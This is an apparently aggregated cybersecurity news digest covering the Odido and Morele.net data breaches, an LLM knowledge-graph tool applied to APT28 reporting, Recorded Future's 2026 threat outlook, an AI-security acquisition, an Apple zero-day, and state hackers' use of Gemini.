The telco discovered the hack last weekend and reported it to the Dutch privacy watchdog. The company said it quickly stopped the unauthorized access and brought in cybersecurity experts to strengthen its defenses.

“The unauthorised access to the system was ended as quickly as possible,” the company said in a statement. “In addition, Odido has brought in cybersecurity experts to implement additional security measures in response to this incident.”

The company urges customers to stay alert for suspicious activity. Criminals may use stolen details to pose as Odido, banks, or other companies through calls, texts, or emails. Avoid clicking unknown links and check senders carefully. Verify unexpected calls by contacting the company directly using official numbers. Never share passwords or PINs. Review invoices closely, as scammers may send fake payment requests. When in doubt, check your account or contact customer support.

The company did not disclose technical details about the attack.

[17] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelved after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

What 2025 teaches us about 2026

The patterns of 2025 point toward a threat environment defined by sustained uncertainty. Security leaders should prepare for:

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026
────────────────────────────────────────────────────────────────────────────────

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

[27] Cyberscoop - Google finds state-sponsored hackers use AI at ‘all stages’ of attack cycle 
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 21:24:46 +0000

[TAM METİN - 733 kelime]
A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Top Dutch telco Odido admits 6.2M customers caught in contact system caper

Names, addresses, bank account numbers accessed – but biz insists passwords and call data untouched

The Netherlands' largest mobile network operator (MNO) has admitted that a breach of its customer contact system may have affected around 6.2 million people.

Odido said that attackers gained access to a range of personal data, including names, home and email addresses, phone numbers, dates of birth, bank account numbers, and ID document details.

The telco insisted that attackers could never have seen passwords, call details, billing or location data, or scans of the ID documents.

It spotted the first signals indicating a breach over the weekend of February 7-8 and promptly reported the incident to the Dutch Data Protection Authority.

Odido said the stolen data has not been published, but warned that it could appear online at some point in the future.

Around 6.2 million people were affected by this attack in some way, the telco told local news media, including its own customers and those of Ben, another MNO owned by Odido. Simpel, a low-budget MNO also under Odido's management, was unaffected.

The company is in the process of informing all affected individuals, either via email (info@mail.odido.nl) or SMS. This message will be tailored to each customer, telling them exactly what personal data was stolen.

In its disclosure, Odido also included tips about what customers should be aware of following the breach, such as scams attackers may attempt using the stolen data for financial gain.

Because names, addresses, phone numbers, and bank account numbers were included in the stolen data, Odido said that cybercriminals may use this to impersonate the telco, the customer's bank, or another third party.

Odido also advised customers about the different ways they can verify a caller's identity if they say they're calling from a bank, and to be wary of fake invoices with company branding, trying to get customers to pay the criminals directly.

CEO Søren Abildgaard said Odido "immediately took additional security measures" after shutting down the attacker's access, as well as informing the data regulator.

"Odido has been affected by a cyberattack, in which customer data has been impacted," said Abildgaard in a letter to customers. "This involves personal data originating from a customer contact system used by Odido. No passwords, call details, or billing data are involved.

"We deeply regret this incident and are fully committed to limiting the impact of this incident and providing our customers with all necessary support. It is important to emphasize that our operational services have not been affected; customers can continue to call, use the internet, and watch TV safely.

"Unauthorized access to the system was ended as quickly as possible. In addition, Odido has engaged external cybersecurity experts to support the implementation of additional security measures as part of the response to this incident."

The Register approached Odido for more information. ®

[29] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

